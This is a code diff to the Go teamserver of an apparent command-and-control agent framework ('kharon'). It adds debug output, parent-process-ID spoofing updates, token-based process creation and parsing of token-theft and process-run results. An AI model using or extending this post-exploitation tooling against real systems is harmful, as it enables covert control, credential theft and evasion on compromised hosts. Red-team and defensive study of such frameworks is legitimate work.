@@ -889,6 +889,9 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 		return taskData, messageData, errors.New("'Error reading agent configuration data")
 	}
 
+	fmt.Printf("[DEBUG] CreateTask - kharon_cfg.ps.parent_id = %d\n", kharon_cfg.ps.parent_id)
+    fmt.Printf("[DEBUG] CreateTask - agent.CustomData length = %d\n", len(agent.CustomData))
+
 	command, ok := args["command"].(string)
 	if !ok {
 		return taskData, messageData, errors.New("'command' must be set")
@@ -945,7 +948,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 
 			pipeNum := 0
-			if pipe, ok := args["pipe"].(bool); ok && pipe {
+			if pipe, ok := args["--pipe"].(bool); ok && pipe {
 				pipeNum = 1
 			}
 
@@ -955,10 +958,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 			tokenID, _ := args["token"].(int)
 
-			// Determine method and validate
-			// 0 = CreateProcess (default)
-			// 1 = CreateProcessWithLogon (credentials)
-			// 2 = CreateProcessWithToken (token)
 			method := 0
 			hasCredentials := domain != "" || username != "" || password != ""
 			hasToken := tokenID != 0
@@ -977,6 +976,10 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			} else if hasToken {
 				method = 2
 			}
+
+			fmt.Printf("pipe number: %d\n", pipeNum)
+			fmt.Printf("parent id: %d\n", kharon_cfg.ps.parent_id)
+			
 
 			bofData, err := LoadExtModule("create", "x64")
 			if err != nil {
@@ -1557,13 +1560,13 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			}
 			messageData.Message = fmt.Sprintf("Task: sleep with %v%% jitter", jitterTime)
 
-			array = []interface{}{TASK_CONFIG, 1, CONFIG_JITTER, jitterTime}
-
 			agent.Jitter = uint(jitterTime)
-			_ = ts.TsAgentUpdateData(agent)
-
 			kharon_cfg.session.jitter = uint32(jitterTime)
 			agent.CustomData, _ = kharon_cfg.Marshal()
+
+			_ = ts.TsAgentUpdateData(agent)
+
+			array = []interface{}{TASK_CONFIG, 1, CONFIG_JITTER, jitterTime}
 
 		case "ppid":
 			pid, ok := args["pid"].(float64)
@@ -1571,9 +1574,23 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'pid' must be set")
 				goto RET
 			}
-
+			
 			kharon_cfg.ps.parent_id = uint32(pid)
-			agent.CustomData, _ = kharon_cfg.Marshal()
+						
+			// serialize kharon config data
+			NewCustomData, err := kharon_cfg.Marshal()
+			if err != nil {
+				goto RET
+			}
+
+			// passing custom data to agent.CustomData
+			agent.CustomData = NewCustomData
+	
+			// update agent data
+			err = ts.TsAgentUpdateData(agent)
+			if err != nil {
+				goto RET
+			}
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_PPID, int(pid)}
 		case "argue":
@@ -2214,8 +2231,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 										task.Message = fmt.Sprintf("Token %v (handle %v) from process [%v] in host [%v] successfully stolen: %v", tokenId, handle, pid, host, user)
 									}
 								}
-							}
-							break
+							}  
 
 						case TOKEN_USE:
 							if cmd_packer.CheckPacker([]string{"int"}) {
@@ -2226,7 +2242,6 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 									task.Message = "Token successfully used"
 								}
 							}
-							break
 
 						case TOKEN_RM:
 							if cmd_packer.CheckPacker([]string{"int"}) {
@@ -2259,7 +2274,6 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 									task.Message = "Token successfully created"
 								}
 							}
-							break
 						case TOKEN_LIST:
 							var list string
 
@@ -2587,8 +2601,21 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 							}
 
 							SyncBrowserProcess(ts, task, proclist)
-							break
-						case PROC_RUN:					
+						case PROC_RUN:
+							if ( cmd_packer.CheckPacker([]string{"int", "int"}) )  {
+								pid := cmd_packer.ParseInt32()
+								tid := cmd_packer.ParseInt32()
+
+								task.Message = fmt.Sprintf("Process created with pid %d and tid %d\n", pid, tid)
+
+								if ( cmd_packer.CheckPacker([]string{"array"}) ) {
+									ps_output := ConvertCpToUTF8( string(cmd_packer.ParseBytes()), agentData.ACP)
+
+									fmt.Println(hex.Dump([]byte(ps_output)))
+
+									task.ClearText = ps_output
+								}
+							}
 						// case DOTNET_INLINE:
 						// case DOTNET_FORK:		
 						// case REFLECT_INLINE:					
